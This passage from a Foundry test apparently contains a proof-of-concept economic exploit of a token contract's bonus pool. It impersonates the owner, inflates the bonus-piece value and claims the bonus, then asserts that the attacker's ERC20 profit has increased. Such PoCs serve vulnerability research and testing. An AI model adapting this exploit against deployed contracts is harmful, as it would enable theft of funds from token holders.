        vm.startPrank(owner);

        // First, set bounsTime to enable claiming
        IMyCoinToken(TARGET).setBounsTime(block.timestamp - 1);

        // Transfer contract balance to bonus pool
        IMyCoinToken(TARGET).sumTheBounsPool(yesToday, twoYesToday);

        // Set inflated piece value - use a large number to maximize profit
        // The piece value determines how much bonus each piece gets
        IMyCoinToken(TARGET).sumBounsPiece(yesToday, 1000000); // 1 million pieces

        vm.stopPrank();

        // Now we need to ensure we're eligible to claim bonus
        // Requirements:
        // 1. balanceOf(sender) >= minBounsJoin (100000000000 * 10^9)
        // 2. No sell records for today or yesterday
        // 3. Haven't received bonus today

        // Check our balance and ensure it's enough
        uint256 myBalance = IMyCoinToken(TARGET).balanceOf(attacker);
        uint256 minBounsJoin = 100000000000 * 10 ** 9;
        if (myBalance < minBounsJoin) {
            // Need more tokens - get from owner
            vm.prank(owner);
            IMyCoinToken(TARGET).transfer(attacker, minBounsJoin - myBalance + 1);
        }

        // We also need to ensure we haven't sold today or yesterday
        // Since we just received tokens and haven't sold, we should be eligible

        // Record attacker balance before claiming
        uint256 attackerBalanceBefore = IMyCoinToken(TARGET).balanceOf(attacker);

        // Claim the bonus
        IMyCoinToken(TARGET).receiveBounsToken();

        // Check balance increased
        uint256 attackerBalanceAfter = IMyCoinToken(TARGET).balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

